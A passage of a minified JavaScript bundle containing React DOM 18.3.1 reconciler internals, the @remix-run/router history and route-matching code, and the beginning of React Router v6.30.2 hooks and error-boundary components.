0:n=Wa(null,n,s,e,t);break e;case 1:n=wc(null,n,s,e,t);break e;case 11:n=vc(null,n,s,e,t);break e;case 14:n=yc(null,n,s,$e(s.type,e),t);break e}throw Error(T(306,s,""))}return n;case 0:return s=n.type,r=n.pendingProps,r=n.elementType===s?r:$e(s,r),Wa(e,n,s,r,t);case 1:return s=n.type,r=n.pendingProps,r=n.elementType===s?r:$e(s,r),wc(e,n,s,r,t);case 3:e:{if(nd(n),e===null)throw Error(T(387));s=n.pendingProps,i=n.memoizedState,r=i.element,Np(e,n),Kr(n,s,null,t);var a=n.memoizedState;if(s=a.element,i.isDehydrated)if(i={element:s,isDehydrated:!1,cache:a.cache,pendingSuspenseBoundaries:a.pendingSuspenseBoundaries,transitions:a.transitions},n.updateQueue.baseState=i,n.memoizedState=i,n.flags&256){r=Ut(Error(T(423)),n),n=kc(e,n,s,t,r);break e}else if(s!==r){r=Ut(Error(T(424)),n),n=kc(e,n,s,t,r);break e}else for(Re=zn(n.stateNode.containerInfo.firstChild),Oe=n,Y=!0,Ye=null,t=Tp(n,null,s,t),n.child=t;t;)t.flags=t.flags&-3|4096,t=t.sibling;else{if(Dt(),s===r){n=kn(e,n,t);break e}we(e,n,s,t)}n=n.child}return n;case 5:return Ap(n),e===null&&Ba(n),s=n.type,r=n.pendingProps,i=e!==null?e.memoizedProps:null,a=r.children,Ma(s,r)?a=null:i!==null&&Ma(s,i)&&(n.flags|=32),ed(e,n),we(e,n,a,t),n.child;case 6:return e===null&&Ba(n),null;case 13:return td(e,n,t);case 4:return Wl(n,n.stateNode.containerInfo),s=n.pendingProps,e===null?n.child=Bt(n,null,s,t):we(e,n,s,t),n.child;case 11:return s=n.type,r=n.pendingProps,r=n.elementType===s?r:$e(s,r),vc(e,n,s,r,t);case 7:return we(e,n,n.pendingProps,t),n.child;case 8:return we(e,n,n.pendingProps.children,t),n.child;case 12:return we(e,n,n.pendingProps.children,t),n.child;case 10:e:{if(s=n.type._context,r=n.pendingProps,i=n.memoizedProps,a=r.value,H(qr,s._currentValue),s._currentValue=a,i!==null)if(Ze(i.value,a)){if(i.children===r.children&&!Ne.current){n=kn(e,n,t);break e}}else for(i=n.child,i!==null&&(i.return=n);i!==null;){var l=i.dependencies;if(l!==null){a=i.child;for(var o=l.firstContext;o!==null;){if(o.context===s){if(i.tag===1){o=gn(-1,t&-t),o.tag=2;var c=i.updateQueue;if(c!==null){c=c.shared;var u=c.pending;u===null?o.next=o:(o.next=u.next,u.next=o),c.pending=o}}i.lanes|=t,o=i.alternate,o!==null&&(o.lanes|=t),Fa(i.return,t,n),l.lanes|=t;break}o=o.next}}else if(i.tag===10)a=i.type===n.type?null:i.child;else if(i.tag===18){if(a=i.return,a===null)throw Error(T(341));a.lanes|=t,l=a.alternate,l!==null&&(l.lanes|=t),Fa(a,t,n),a=i.sibling}else a=i.child;if(a!==null)a.return=i;else for(a=i;a!==null;){if(a===n){a=null;break}if(i=a.sibling,i!==null){i.return=a.return,a=i;break}a=a.return}i=a}we(e,n,r.children,t),n=n.child}return n;case 9:return r=n.type,s=n.pendingProps.children,Rt(n,t),r=Ve(r),s=s(r),n.flags|=1,we(e,n,s,t),n.child;case 14:return s=n.type,r=$e(s,n.pendingProps),r=$e(s.type,r),yc(e,n,s,r,t);case 15:return Zp(e,n,n.type,n.pendingProps,t);case 17:return s=n.type,r=n.pendingProps,r=n.elementType===s?r:$e(s,r),Cr(e,n),n.tag=1,Ae(s)?(e=!0,$r(n)):e=!1,Rt(n,t),Xp(n,s,r),Va(n,s,r,t),$a(null,n,s,!0,e,t);case 19:return sd(e,n,t);case 22:return Jp(e,n,t)}throw Error(T(156,n.tag))};function wd(e,n){return Gu(e,n)}function Pm(e,n,t,s){this.tag=e,this.key=t,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=n,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=s,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function Fe(e,n,t,s){return new Pm(e,n,t,s)}function io(e){return e=e.prototype,!(!e||!e.isReactComponent)}function Lm(e){if(typeof e=="function")return io(e)?1:0;if(e!=null){if(e=e.$$typeof,e===Sl)return 11;if(e===El)return 14}return 2}function Un(e,n){var t=e.alternate;return t===null?(t=Fe(e.tag,n,e.key,e.mode),t.elementType=e.elementType,t.type=e.type,t.stateNode=e.stateNode,t.alternate=e,e.alternate=t):(t.pendingProps=n,t.type=e.type,t.flags=0,t.subtreeFlags=0,t.deletions=null),t.flags=e.flags&14680064,t.childLanes=e.childLanes,t.lanes=e.lanes,t.child=e.child,t.memoizedProps=e.memoizedProps,t.memoizedState=e.memoizedState,t.updateQueue=e.updateQueue,n=e.dependencies,t.dependencies=n===null?null:{lanes:n.lanes,firstContext:n.firstContext},t.sibling=e.sibling,t.index=e.index,t.ref=e.ref,t}function Pr(e,n,t,s,r,i){var a=2;if(s=e,typeof e=="function")io(e)&&(a=1);else if(typeof e=="string")a=5;else e:switch(e){case vt:return st(t.children,r,i,n);case _l:a=8,r|=8;break;case da:return e=Fe(12,t,n,r|2),e.elementType=da,e.lanes=i,e;case ha:return e=Fe(13,t,n,r),e.elementType=ha,e.lanes=i,e;case fa:return e=Fe(19,t,n,r),e.elementType=fa,e.lanes=i,e;case Au:return _i(t,r,i,n);default:if(typeof e=="object"&&e!==null)switch(e.$$typeof){case Cu:a=10;break e;case Nu:a=9;break e;case Sl:a=11;break e;case El:a=14;break e;case En:a=16,s=null;break e}throw Error(T(130,e==null?e:typeof e,""))}return n=Fe(a,t,n,r),n.elementType=e,n.type=s,n.lanes=i,n}function st(e,n,t,s){return e=Fe(7,e,s,n),e.lanes=t,e}function _i(e,n,t,s){return e=Fe(22,e,s,n),e.elementType=Au,e.lanes=t,e.stateNode={isHidden:!1},e}function ia(e,n,t){return e=Fe(6,e,null,n),e.lanes=t,e}function aa(e,n,t){return n=Fe(4,e.children!==null?e.children:[],e.key,n),n.lanes=t,n.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},n}function Rm(e,n,t,s,r){this.tag=n,this.containerInfo=e,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=Fi(0),this.expirationTimes=Fi(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=Fi(0),this.identifierPrefix=s,this.onRecoverableError=r,this.mutableSourceEagerHydrationData=null}function ao(e,n,t,s,r,i,a,l,o){return e=new Rm(e,n,t,l,o),n===1?(n=1,i===!0&&(n|=8)):n=0,i=Fe(3,null,null,n),e.current=i,i.stateNode=e,i.memoizedState={element:s,isDehydrated:t,cache:null,transitions:null,pendingSuspenseBoundaries:null},Hl(i),e}function Om(e,n,t){var s=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:gt,key:s==null?null:""+s,children:e,containerInfo:n,implementation:t}}function kd(e){if(!e)return Wn;e=e._reactInternals;e:{if(ht(e)!==e||e.tag!==1)throw Error(T(170));var n=e;do{switch(n.tag){case 3:n=n.stateNode.context;break e;case 1:if(Ae(n.type)){n=n.stateNode.__reactInternalMemoizedMergedChildContext;break e}}n=n.return}while(n!==null);throw Error(T(171))}if(e.tag===1){var t=e.type;if(Ae(t))return kp(e,t,n)}return n}function xd(e,n,t,s,r,i,a,l,o){return e=ao(t,s,!0,e,r,i,a,l,o),e.context=kd(null),t=e.current,s=xe(),r=Fn(t),i=gn(s,r),i.callback=n??null,Dn(t,i,r),e.current.lanes=r,Ws(e,r,s),Pe(e,s),e}function Si(e,n,t,s){var r=n.current,i=xe(),a=Fn(r);return t=kd(t),n.context===null?n.context=t:n.pendingContext=t,n=gn(i,a),n.payload={element:e},s=s===void 0?null:s,s!==null&&(n.callback=s),e=Dn(r,n,a),e!==null&&(Qe(e,r,a,i),Sr(e,r,a)),a}function ri(e){if(e=e.current,!e.child)return null;switch(e.child.tag){case 5:return e.child.stateNode;default:return e.child.stateNode}}function Pc(e,n){if(e=e.memoizedState,e!==null&&e.dehydrated!==null){var t=e.retryLane;e.retryLane=t!==0&&t<n?t:n}}function lo(e,n){Pc(e,n),(e=e.alternate)&&Pc(e,n)}function Mm(){return null}var bd=typeof reportError=="function"?reportError:function(e){console.error(e)};function oo(e){this._internalRoot=e}Ei.prototype.render=oo.prototype.render=function(e){var n=this._internalRoot;if(n===null)throw Error(T(409));Si(e,n,null,null)};Ei.prototype.unmount=oo.prototype.unmount=function(){var e=this._internalRoot;if(e!==null){this._internalRoot=null;var n=e.containerInfo;ut(function(){Si(null,e,null,null)}),n[yn]=null}};function Ei(e){this._internalRoot=e}Ei.prototype.unstable_scheduleHydration=function(e){if(e){var n=Ju();e={blockedOn:null,target:e,priority:n};for(var t=0;t<Nn.length&&n!==0&&n<Nn[t].priority;t++);Nn.splice(t,0,e),t===0&&np(e)}};function co(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11)}function Ti(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11&&(e.nodeType!==8||e.nodeValue!==" react-mount-point-unstable "))}function Lc(){}function jm(e,n,t,s,r){if(r){if(typeof s=="function"){var i=s;s=function(){var c=ri(a);i.call(c)}}var a=xd(n,s,e,0,null,!1,!1,"",Lc);return e._reactRootContainer=a,e[yn]=a.current,Ns(e.nodeType===8?e.parentNode:e),ut(),a}for(;r=e.lastChild;)e.removeChild(r);if(typeof s=="function"){var l=s;s=function(){var c=ri(o);l.call(c)}}var o=ao(e,0,!1,null,null,!1,!1,"",Lc);return e._reactRootContainer=o,e[yn]=o.current,Ns(e.nodeType===8?e.parentNode:e),ut(function(){Si(n,o,t,s)}),o}function Ci(e,n,t,s,r){var i=t._reactRootContainer;if(i){var a=i;if(typeof r=="function"){var l=r;r=function(){var o=ri(a);l.call(o)}}Si(n,a,e,r)}else a=jm(t,n,e,r,s);return ri(a)}Qu=function(e){switch(e.tag){case 3:var n=e.stateNode;if(n.current.memoizedState.isDehydrated){var t=ls(n.pendingLanes);t!==0&&(Nl(n,t|1),Pe(n,J()),!(U&6)&&(Vt=J()+500,Yn()))}break;case 13:ut(function(){var s=wn(e,1);if(s!==null){var r=xe();Qe(s,e,1,r)}}),lo(e,1)}};Al=function(e){if(e.tag===13){var n=wn(e,134217728);if(n!==null){var t=xe();Qe(n,e,134217728,t)}lo(e,134217728)}};Zu=function(e){if(e.tag===13){var n=Fn(e),t=wn(e,n);if(t!==null){var s=xe();Qe(t,e,n,s)}lo(e,n)}};Ju=function(){return V};ep=function(e,n){var t=V;try{return V=e,n()}finally{V=t}};Sa=function(e,n,t){switch(n){case"input":if(va(e,t),n=t.name,t.type==="radio"&&n!=null){for(t=e;t.parentNode;)t=t.parentNode;for(t=t.querySelectorAll("input[name="+JSON.stringify(""+n)+'][type="radio"]'),n=0;n<t.length;n++){var s=t[n];if(s!==e&&s.form===e.form){var r=vi(s);if(!r)throw Error(T(90));Lu(s),va(s,r)}}}break;case"textarea":Ou(e,t);break;case"select":n=t.value,n!=null&&Nt(e,!!t.multiple,n,!1)}};Fu=to;Uu=ut;var Im={usingClientEntryPoint:!1,Events:[Gs,xt,vi,Du,Bu,to]},ts={findFiberByHostInstance:Zn,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},zm={bundleType:ts.bundleType,version:ts.version,rendererPackageName:ts.rendererPackageName,rendererConfig:ts.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:bn.ReactCurrentDispatcher,findHostInstanceByFiber:function(e){return e=Wu(e),e===null?null:e.stateNode},findFiberByHostInstance:ts.findFiberByHostInstance||Mm,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var fr=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!fr.isDisabled&&fr.supportsFiber)try{hi=fr.inject(zm),sn=fr}catch{}}Ie.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=Im;Ie.createPortal=function(e,n){var t=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!co(n))throw Error(T(200));return Om(e,n,null,t)};Ie.createRoot=function(e,n){if(!co(e))throw Error(T(299));var t=!1,s="",r=bd;return n!=null&&(n.unstable_strictMode===!0&&(t=!0),n.identifierPrefix!==void 0&&(s=n.identifierPrefix),n.onRecoverableError!==void 0&&(r=n.onRecoverableError)),n=ao(e,1,!1,null,null,t,!1,s,r),e[yn]=n.current,Ns(e.nodeType===8?e.parentNode:e),new oo(n)};Ie.findDOMNode=function(e){if(e==null)return null;if(e.nodeType===1)return e;var n=e._reactInternals;if(n===void 0)throw typeof e.render=="function"?Error(T(188)):(e=Object.keys(e).join(","),Error(T(268,e)));return e=Wu(n),e=e===null?null:e.stateNode,e};Ie.flushSync=function(e){return ut(e)};Ie.hydrate=function(e,n,t){if(!Ti(n))throw Error(T(200));return Ci(null,e,n,!0,t)};Ie.hydrateRoot=function(e,n,t){if(!co(e))throw Error(T(405));var s=t!=null&&t.hydratedSources||null,r=!1,i="",a=bd;if(t!=null&&(t.unstable_strictMode===!0&&(r=!0),t.identifierPrefix!==void 0&&(i=t.identifierPrefix),t.onRecoverableError!==void 0&&(a=t.onRecoverableError)),n=xd(n,null,e,1,t??null,r,!1,i,a),e[yn]=n.current,Ns(e),s)for(e=0;e<s.length;e++)t=s[e],r=t._getVersion,r=r(t._source),n.mutableSourceEagerHydrationData==null?n.mutableSourceEagerHydrationData=[t,r]:n.mutableSourceEagerHydrationData.push(t,r);return new Ei(n)};Ie.render=function(e,n,t){if(!Ti(n))throw Error(T(200));return Ci(null,e,n,!1,t)};Ie.unmountComponentAtNode=function(e){if(!Ti(e))throw Error(T(40));return e._reactRootContainer?(ut(function(){Ci(null,null,e,!1,function(){e._reactRootContainer=null,e[yn]=null})}),!0):!1};Ie.unstable_batchedUpdates=to;Ie.unstable_renderSubtreeIntoContainer=function(e,n,t,s){if(!Ti(t))throw Error(T(200));if(e==null||e._reactInternals===void 0)throw Error(T(38));return Ci(e,n,t,!1,s)};Ie.version="18.3.1-next-f1338f8080-20240426";function _d(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(_d)}catch(e){console.error(e)}}_d(),_u.exports=Ie;var Dm=_u.exports,Sd,Rc=Dm;Sd=Rc.createRoot,Rc.hydrateRoot;/**
 * @remix-run/router v1.23.1
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function zs(){return zs=Object.assign?Object.assign.bind():function(e){for(var n=1;n<arguments.length;n++){var t=arguments[n];for(var s in t)Object.prototype.hasOwnProperty.call(t,s)&&(e[s]=t[s])}return e},zs.apply(this,arguments)}var Rn;(function(e){e.Pop="POP",e.Push="PUSH",e.Replace="REPLACE"})(Rn||(Rn={}));const Oc="popstate";function Bm(e){e===void 0&&(e={});function n(s,r){let{pathname:i,search:a,hash:l}=s.location;return sl("",{pathname:i,search:a,hash:l},r.state&&r.state.usr||null,r.state&&r.state.key||"default")}function t(s,r){return typeof r=="string"?r:ii(r)}return Um(n,t,null,e)}function ne(e,n){if(e===!1||e===null||typeof e>"u")throw new Error(n)}function uo(e,n){if(!e){typeof console<"u"&&console.warn(n);try{throw new Error(n)}catch{}}}function Fm(){return Math.random().toString(36).substr(2,8)}function Mc(e,n){return{usr:e.state,key:e.key,idx:n}}function sl(e,n,t,s){return t===void 0&&(t=null),zs({pathname:typeof e=="string"?e:e.pathname,search:"",hash:""},typeof n=="string"?qt(n):n,{state:t,key:n&&n.key||s||Fm()})}function ii(e){let{pathname:n="/",search:t="",hash:s=""}=e;return t&&t!=="?"&&(n+=t.charAt(0)==="?"?t:"?"+t),s&&s!=="#"&&(n+=s.charAt(0)==="#"?s:"#"+s),n}function qt(e){let n={};if(e){let t=e.indexOf("#");t>=0&&(n.hash=e.substr(t),e=e.substr(0,t));let s=e.indexOf("?");s>=0&&(n.search=e.substr(s),e=e.substr(0,s)),e&&(n.pathname=e)}return n}function Um(e,n,t,s){s===void 0&&(s={});let{window:r=document.defaultView,v5Compat:i=!1}=s,a=r.history,l=Rn.Pop,o=null,c=u();c==null&&(c=0,a.replaceState(zs({},a.state,{idx:c}),""));function u(){return(a.state||{idx:null}).idx}function m(){l=Rn.Pop;let x=u(),p=x==null?null:x-c;c=x,o&&o({action:l,location:y.location,delta:p})}function h(x,p){l=Rn.Push;let f=sl(y.location,x,p);c=u()+1;let v=Mc(f,c),w=y.createHref(f);try{a.pushState(v,"",w)}catch(_){if(_ instanceof DOMException&&_.name==="DataCloneError")throw _;r.location.assign(w)}i&&o&&o({action:l,location:y.location,delta:1})}function g(x,p){l=Rn.Replace;let f=sl(y.location,x,p);c=u();let v=Mc(f,c),w=y.createHref(f);a.replaceState(v,"",w),i&&o&&o({action:l,location:y.location,delta:0})}function k(x){let p=r.location.origin!=="null"?r.location.origin:r.location.href,f=typeof x=="string"?x:ii(x);return f=f.replace(/ $/,"%20"),ne(p,"No window.location.(origin|href) available to create URL for href: "+f),new URL(f,p)}let y={get action(){return l},get location(){return e(r,a)},listen(x){if(o)throw new Error("A history only accepts one active listener");return r.addEventListener(Oc,m),o=x,()=>{r.removeEventListener(Oc,m),o=null}},createHref(x){return n(r,x)},createURL:k,encodeLocation(x){let p=k(x);return{pathname:p.pathname,search:p.search,hash:p.hash}},push:h,replace:g,go(x){return a.go(x)}};return y}var jc;(function(e){e.data="data",e.deferred="deferred",e.redirect="redirect",e.error="error"})(jc||(jc={}));function Vm(e,n,t){return t===void 0&&(t="/"),Hm(e,n,t)}function Hm(e,n,t,s){let r=typeof n=="string"?qt(n):n,i=po(r.pathname||"/",t);if(i==null)return null;let a=Ed(e);Wm(a);let l=null;for(let o=0;l==null&&o<a.length;++o){let c=tg(i);l=Jm(a[o],c)}return l}function Ed(e,n,t,s){n===void 0&&(n=[]),t===void 0&&(t=[]),s===void 0&&(s="");let r=(i,a,l)=>{let o={relativePath:l===void 0?i.path||"":l,caseSensitive:i.caseSensitive===!0,childrenIndex:a,route:i};o.relativePath.startsWith("/")&&(ne(o.relativePath.startsWith(s),'Absolute route path "'+o.relativePath+'" nested under path '+('"'+s+'" is not valid. An absolute child route path ')+"must start with the combined path of all its parent routes."),o.relativePath=o.relativePath.slice(s.length));let c=Vn([s,o.relativePath]),u=t.concat(o);i.children&&i.children.length>0&&(ne(i.index!==!0,"Index routes must not have child routes. Please remove "+('all child routes from route path "'+c+'".')),Ed(i.children,n,u,c)),!(i.path==null&&!i.index)&&n.push({path:c,score:Qm(c,i.index),routesMeta:u})};return e.forEach((i,a)=>{var l;if(i.path===""||!((l=i.path)!=null&&l.includes("?")))r(i,a);else for(let o of Td(i.path))r(i,a,o)}),n}function Td(e){let n=e.split("/");if(n.length===0)return[];let[t,...s]=n,r=t.endsWith("?"),i=t.replace(/\?$/,"");if(s.length===0)return r?[i,""]:[i];let a=Td(s.join("/")),l=[];return l.push(...a.map(o=>o===""?i:[i,o].join("/"))),r&&l.push(...a),l.map(o=>e.startsWith("/")&&o===""?"/":o)}function Wm(e){e.sort((n,t)=>n.score!==t.score?t.score-n.score:Zm(n.routesMeta.map(s=>s.childrenIndex),t.routesMeta.map(s=>s.childrenIndex)))}const $m=/^:[\w-]+$/,Gm=3,Ym=2,qm=1,Xm=10,Km=-2,Ic=e=>e==="*";function Qm(e,n){let t=e.split("/"),s=t.length;return t.some(Ic)&&(s+=Km),n&&(s+=Ym),t.filter(r=>!Ic(r)).reduce((r,i)=>r+($m.test(i)?Gm:i===""?qm:Xm),s)}function Zm(e,n){return e.length===n.length&&e.slice(0,-1).every((s,r)=>s===n[r])?e[e.length-1]-n[n.length-1]:0}function Jm(e,n,t){let{routesMeta:s}=e,r={},i="/",a=[];for(let l=0;l<s.length;++l){let o=s[l],c=l===s.length-1,u=i==="/"?n:n.slice(i.length)||"/",m=eg({path:o.relativePath,caseSensitive:o.caseSensitive,end:c},u),h=o.route;if(!m)return null;Object.assign(r,m.params),a.push({params:r,pathname:Vn([i,m.pathname]),pathnameBase:lg(Vn([i,m.pathnameBase])),route:h}),m.pathnameBase!=="/"&&(i=Vn([i,m.pathnameBase]))}return a}function eg(e,n){typeof e=="string"&&(e={path:e,caseSensitive:!1,end:!0});let[t,s]=ng(e.path,e.caseSensitive,e.end),r=n.match(t);if(!r)return null;let i=r[0],a=i.replace(/(.)\/+$/,"$1"),l=r.slice(1);return{params:s.reduce((c,u,m)=>{let{paramName:h,isOptional:g}=u;if(h==="*"){let y=l[m]||"";a=i.slice(0,i.length-y.length).replace(/(.)\/+$/,"$1")}const k=l[m];return g&&!k?c[h]=void 0:c[h]=(k||"").replace(/%2F/g,"/"),c},{}),pathname:i,pathnameBase:a,pattern:e}}function ng(e,n,t){n===void 0&&(n=!1),t===void 0&&(t=!0),uo(e==="*"||!e.endsWith("*")||e.endsWith("/*"),'Route path "'+e+'" will be treated as if it were '+('"'+e.replace(/\*$/,"/*")+'" because the `*` character must ')+"always follow a `/` in the pattern. To get rid of this warning, "+('please change the route path to "'+e.replace(/\*$/,"/*")+'".'));let s=[],r="^"+e.replace(/\/*\*?$/,"").replace(/^\/*/,"/").replace(/[\\.*+^${}|()[\]]/g,"\\$&").replace(/\/:([\w-]+)(\?)?/g,(a,l,o)=>(s.push({paramName:l,isOptional:o!=null}),o?"/?([^\\/]+)?":"/([^\\/]+)"));return e.endsWith("*")?(s.push({paramName:"*"}),r+=e==="*"||e==="/*"?"(.*)$":"(?:\\/(.+)|\\/*)$"):t?r+="\\/*$":e!==""&&e!=="/"&&(r+="(?:(?=\\/|$))"),[new RegExp(r,n?void 0:"i"),s]}function tg(e){try{return e.split("/").map(n=>decodeURIComponent(n).replace(/\//g,"%2F")).join("/")}catch(n){return uo(!1,'The URL path "'+e+'" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent '+("encoding ("+n+").")),e}}function po(e,n){if(n==="/")return e;if(!e.toLowerCase().startsWith(n.toLowerCase()))return null;let t=n.endsWith("/")?n.length-1:n.length,s=e.charAt(t);return s&&s!=="/"?null:e.slice(t)||"/"}const sg=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,rg=e=>sg.test(e);function ig(e,n){n===void 0&&(n="/");let{pathname:t,search:s="",hash:r=""}=typeof e=="string"?qt(e):e,i;if(t)if(rg(t))i=t;else{if(t.includes("//")){let a=t;t=t.replace(/\/\/+/g,"/"),uo(!1,"Pathnames cannot have embedded double slashes - normalizing "+(a+" -> "+t))}t.startsWith("/")?i=zc(t.substring(1),"/"):i=zc(t,n)}else i=n;return{pathname:i,search:og(s),hash:cg(r)}}function zc(e,n){let t=n.replace(/\/+$/,"").split("/");return e.split("/").forEach(r=>{r===".."?t.length>1&&t.pop():r!=="."&&t.push(r)}),t.length>1?t.join("/"):"/"}function la(e,n,t,s){return"Cannot include a '"+e+"' character in a manually specified "+("`to."+n+"` field ["+JSON.stringify(s)+"].  Please separate it out to the ")+("`to."+t+"` field. Alternatively you may provide the full path as ")+'a string in <Link to="..."> and the router will parse it for you.'}function ag(e){return e.filter((n,t)=>t===0||n.route.path&&n.route.path.length>0)}function Cd(e,n){let t=ag(e);return n?t.map((s,r)=>r===t.length-1?s.pathname:s.pathnameBase):t.map(s=>s.pathnameBase)}function Nd(e,n,t,s){s===void 0&&(s=!1);let r;typeof e=="string"?r=qt(e):(r=zs({},e),ne(!r.pathname||!r.pathname.includes("?"),la("?","pathname","search",r)),ne(!r.pathname||!r.pathname.includes("#"),la("#","pathname","hash",r)),ne(!r.search||!r.search.includes("#"),la("#","search","hash",r)));let i=e===""||r.pathname==="",a=i?"/":r.pathname,l;if(a==null)l=t;else{let m=n.length-1;if(!s&&a.startsWith("..")){let h=a.split("/");for(;h[0]==="..";)h.shift(),m-=1;r.pathname=h.join("/")}l=m>=0?n[m]:"/"}let o=ig(r,l),c=a&&a!=="/"&&a.endsWith("/"),u=(i||a===".")&&t.endsWith("/");return!o.pathname.endsWith("/")&&(c||u)&&(o.pathname+="/"),o}const Vn=e=>e.join("/").replace(/\/\/+/g,"/"),lg=e=>e.replace(/\/+$/,"").replace(/^\/*/,"/"),og=e=>!e||e==="?"?"":e.startsWith("?")?e:"?"+e,cg=e=>!e||e==="#"?"":e.startsWith("#")?e:"#"+e;function ug(e){return e!=null&&typeof e.status=="number"&&typeof e.statusText=="string"&&typeof e.internal=="boolean"&&"data"in e}const Ad=["post","put","patch","delete"];new Set(Ad);const pg=["get",...Ad];new Set(pg);/**
 * React Router v6.30.2
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function Ds(){return Ds=Object.assign?Object.assign.bind():function(e){for(var n=1;n<arguments.length;n++){var t=arguments[n];for(var s in t)Object.prototype.hasOwnProperty.call(t,s)&&(e[s]=t[s])}return e},Ds.apply(this,arguments)}const ho=S.createContext(null),dg=S.createContext(null),ft=S.createContext(null),Ni=S.createContext(null),qn=S.createContext({outlet:null,matches:[],isDataRoute:!1}),Pd=S.createContext(null);function hg(e,n){let{relative:t}=n===void 0?{}:n;qs()||ne(!1);let{basename:s,navigator:r}=S.useContext(ft),{hash:i,pathname:a,search:l}=Od(e,{relative:t}),o=a;return s!=="/"&&(o=a==="/"?s:Vn([s,a])),r.createHref({pathname:o,search:l,hash:i})}function qs(){return S.useContext(Ni)!=null}function Xs(){return qs()||ne(!1),S.useContext(Ni).location}function Ld(e){S.useContext(ft).static||S.useLayoutEffect(e)}function Rd(){let{isDataRoute:e}=S.useContext(qn);return e?Cg():fg()}function fg(){qs()||ne(!1);let e=S.useContext(ho),{basename:n,future:t,navigator:s}=S.useContext(ft),{matches:r}=S.useContext(qn),{pathname:i}=Xs(),a=JSON.stringify(Cd(r,t.v7_relativeSplatPath)),l=S.useRef(!1);return Ld(()=>{l.current=!0}),S.useCallback(function(c,u){if(u===void 0&&(u={}),!l.current)return;if(typeof c=="number"){s.go(c);return}let m=Nd(c,JSON.parse(a),i,u.relative==="path");e==null&&n!=="/"&&(m.pathname=m.pathname==="/"?n:Vn([n,m.pathname])),(u.replace?s.replace:s.push)(m,u.state,u)},[n,s,a,i,e])}function mg(){let{matches:e}=S.useContext(qn),n=e[e.length-1];return n?n.params:{}}function Od(e,n){let{relative:t}=n===void 0?{}:n,{future:s}=S.useContext(ft),{matches:r}=S.useContext(qn),{pathname:i}=Xs(),a=JSON.stringify(Cd(r,s.v7_relativeSplatPath));return S.useMemo(()=>Nd(e,JSON.parse(a),i,t==="path"),[e,a,i,t])}function gg(e,n){return vg(e,n)}function vg(e,n,t,s){qs()||ne(!1);let{navigator:r}=S.useContext(ft),{matches:i}=S.useContext(qn),a=i[i.length-1],l=a?a.params:{};a&&a.pathname;let o=a?a.pathnameBase:"/";a&&a.route;let c=Xs(),u;if(n){var m;let x=typeof n=="string"?qt(n):n;o==="/"||(m=x.pathname)!=null&&m.startsWith(o)||ne(!1),u=x}else u=c;let h=u.pathname||"/",g=h;if(o!=="/"){let x=o.replace(/^\//,"").split("/");g="/"+h.replace(/^\//,"").split("/").slice(x.length).join("/")}let k=Vm(e,{pathname:g}),y=bg(k&&k.map(x=>Object.assign({},x,{params:Object.assign({},l,x.params),pathname:Vn([o,r.encodeLocation?r.encodeLocation(x.pathname).pathname:x.pathname]),pathnameBase:x.pathnameBase==="/"?o:Vn([o,r.encodeLocation?r.encodeLocation(x.pathnameBase).pathname:x.pathnameBase])})),i,t,s);return n&&y?S.createElement(Ni.Provider,{value:{location:Ds({pathname:"/",search:"",hash:"",state:null,key:"default"},u),navigationType:Rn.Pop}},y):y}function yg(){let e=Tg(),n=ug(e)?e.status+" "+e.statusText:e instanceof Error?e.message:JSON.stringify(e),t=e instanceof Error?e.stack:null,r={padding:"0.5rem",backgroundColor:"rgba(200,200,200, 0.5)"};return S.createElement(S.Fragment,null,S.createElement("h2",null,"Unexpected Application Error!"),S.createElement("h3",{style:{fontStyle:"italic"}},n),t?S.createElement("pre",{style:r},t):null,null)}const wg=S.createElement(yg,null);class kg extends S.Component{constructor(n){super(n),this.state={location:n.location,revalidation:n.revalidation,error:n.error}}static getDerivedStateFromError(n){return{error:n}}static getDerivedStateFromProps(n,t){return t.location!==n.location||t.revalidation!=="idle"&&n.revalidation==="idle"?{error:n.error,location:n.location,revalidation:n.revalidation}:{error:n.error!==void 0?n.error:t.error,location:t.location,revalidation:n.revalidation||t.revalidation}}componentDidCatch(n,t){console.error("React Router caught the following error during render",n,t)}render(){return this.state.error!==void 0?S.createElement(qn.Provider,{value:this.props.routeContext},S.createElement(Pd.Provider,{value:this.state.error,children:this.props.component})):this.props.children}}function xg(e){let{routeContext:n,match:t,children:s}=e,r=S.useContext(ho);return r&&r.static&&r.staticContext&&(t.route.errorElement||t.route.ErrorBoundary)&&(r.staticContext._deepestRenderedBoundaryId=t.route.id),S.createElement(qn.Provider,{value:n},s)}function bg(e,n,t,s){var r;if(n===void 